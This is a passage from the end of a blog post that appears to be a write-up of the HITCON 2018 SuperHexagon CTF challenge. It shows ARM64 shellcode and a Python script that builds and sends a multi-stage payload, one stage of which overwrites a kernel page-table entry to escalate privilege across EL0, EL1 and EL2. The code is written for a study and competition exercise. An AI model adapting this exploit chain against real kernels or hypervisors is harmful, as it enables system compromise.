</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0 // IPA 0x36000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5 // r-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // IPA 0x37000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // now we can modify the kernel page table
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub x11, x11, #0xa0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x123
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> EL2_shellcode 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(payload) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x500</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x500</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> SEL0_shellcode
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(EL1_shellcode)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># AP 01 -&gt; EL0 RW EL1 RW </span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/hitcon-2018-superhexagon/">HITCON 2018 SuperHexagon</a></li>
      <li><a href="https://msh1307.kr/tags/hypervisor-exploit/">Hypervisor Exploit</a></li>
      <li><a href="https://msh1307.kr/tags/kernel-exploit/">Kernel Exploit</a></li>
      <li><a href="https://msh1307.kr/tags/secure-monitor-exploit/">Secure Monitor Exploit</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
